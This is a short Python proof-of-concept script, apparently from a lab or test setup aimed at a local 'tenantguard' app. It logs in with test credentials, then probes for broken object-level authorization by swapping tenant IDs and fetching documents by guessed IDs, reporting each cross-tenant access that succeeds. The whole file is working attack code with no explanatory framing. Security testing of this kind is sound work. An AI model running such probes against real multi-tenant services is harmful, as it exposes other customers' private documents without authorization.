#!/usr/bin/env python3

import requests
import json

BASE_URL = "http://localhost:5000"

def exploit_bola():
    print("[*] Testing BOLA vulnerabilities...")
    
    # Login as regular user
    login_data = {
        "email": "test@tenantguard.com",
        "password": "test123"
    }
    
    response = requests.post(f"{BASE_URL}/api/auth/login", json=login_data)
    if response.status_code != 200:
        print("[-] Login failed")
        return False
    
    token = response.json()["token"]
    headers = {"Authorization": f"Bearer {token}"}
    
    # Try to access documents from other tenants
    print("[*] Attempting cross-tenant document access...")
    
    # Get documents with different tenant IDs
    for tenant_id in ["507f1f77bcf86cd799439011", "507f1f77bcf86cd799439012"]:
        params = {"tenantId": tenant_id}
        doc_response = requests.get(f"{BASE_URL}/api/documents", 
                                  headers=headers, params=params)
        
        if doc_response.status_code == 200:
            docs = doc_response.json()
            print(f"[+] Accessed {len(docs)} documents from tenant {tenant_id}")
    
    # Try to access any document by ID
    print("[*] Testing direct document access...")
    doc_ids = ["507f1f77bcf86cd799439013", "507f1f77bcf86cd799439014"]
    
    for doc_id in doc_ids:
        doc_response = requests.get(f"{BASE_URL}/api/documents/{doc_id}", 
                                  headers=headers)
        if doc_response.status_code == 200:
            print(f"[+] Successfully accessed document {doc_id}")
    
    return True

if __name__ == "__main__":
    exploit_bola()